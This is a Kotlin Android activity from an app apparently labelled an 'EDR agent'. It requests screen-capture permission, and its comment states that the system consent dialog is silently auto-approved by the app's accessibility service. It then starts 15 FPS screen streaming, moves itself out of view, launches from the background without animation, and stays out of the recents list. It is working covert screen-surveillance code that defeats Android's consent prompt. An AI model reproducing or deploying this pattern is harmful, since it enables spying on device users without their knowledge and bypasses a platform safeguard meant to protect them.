package com.edr.agent.screen

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Bundle
import android.util.Log
import com.edr.agent.service.EdrForegroundService
import com.edr.agent.storage.EdrLocalStorage

/**
 * Transparent helper activity that requests MediaProjection token from Android OS.
 * The system prompt is automatically and silently approved by EdrAccessibilityService.
 */
class MediaProjectionCaptureActivity : Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        activeInstance = this
        try {
            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as? MediaProjectionManager
            if (mpm != null) {
                Log.i(TAG, "Requesting MediaProjection screen capture intent...")
                EdrLocalStorage.appendEdrLog(this, "MEDIA_PROJ", "Requesting MediaProjection screen capture intent")
                // Signal our AccessibilityService to watch for the grant dialog
                // ONLY our own dialog will be auto-approved, not any user dialog
                com.edr.agent.service.EdrAccessibilityService.instance?.setWaitingForMediaProjection(true)
                val intent = mpm.createScreenCaptureIntent()
                startActivityForResult(intent, REQUEST_MEDIA_PROJECTION)
            } else {
                Log.e(TAG, "MediaProjectionManager is null")
                EdrLocalStorage.appendEdrLog(this, "MEDIA_PROJ", "Error: MediaProjectionManager is null")
                finish()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error requesting MediaProjection: ${e.message}", e)
            EdrLocalStorage.appendEdrLog(this, "MEDIA_PROJ", "Exception requesting projection: ${e.message}")
            com.edr.agent.service.EdrAccessibilityService.instance?.setWaitingForMediaProjection(false)
            finish()
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQUEST_MEDIA_PROJECTION) {
            // Clear the "waiting" flag regardless of outcome
            com.edr.agent.service.EdrAccessibilityService.instance?.setWaitingForMediaProjection(false)
            if (resultCode == RESULT_OK && data != null) {
                Log.i(TAG, "MediaProjection permission granted by user/system! Promoting FGS and activating 15 FPS...")
                EdrLocalStorage.appendEdrLog(this, "MEDIA_PROJ", "RESULT_OK received! Promoting FGS to MEDIA_PROJECTION")
                EdrForegroundService.instance?.promoteToMediaProjection()
                ScreenStreamManager.onMediaProjectionGranted(applicationContext, resultCode, data)
                moveTaskToBack(true)
                return
            } else {
                Log.w(TAG, "MediaProjection permission was denied or cancelled: resultCode=$resultCode")
                EdrLocalStorage.appendEdrLog(this, "MEDIA_PROJ", "Denied or cancelled: resultCode=$resultCode")
            }
        }
        finish()
    }

    override fun onDestroy() {
        if (activeInstance == this) activeInstance = null
        super.onDestroy()
    }

    companion object {
        private const val TAG = "MediaProjectionActivity"
        const val REQUEST_MEDIA_PROJECTION = 9988
        var activeInstance: MediaProjectionCaptureActivity? = null
            private set

        fun finishActive() {
            try {
                activeInstance?.finish()
                activeInstance = null
            } catch (e: Exception) {
                Log.w(TAG, "Error finishing MediaProjectionCaptureActivity: ${e.message}")
            }
        }

        fun launch(context: Context) {
            val intent = Intent(context, MediaProjectionCaptureActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION)
                addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
            }
            try {
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    val options = android.app.ActivityOptions.makeBasic().apply {
                        setPendingIntentBackgroundActivityStartMode(android.app.ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED)
                    }
                    context.startActivity(intent, options.toBundle())
                } else {
                    context.startActivity(intent)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error launching MediaProjectionCaptureActivity: ${e.message}")
                context.startActivity(intent)
            }
        }
    }
}
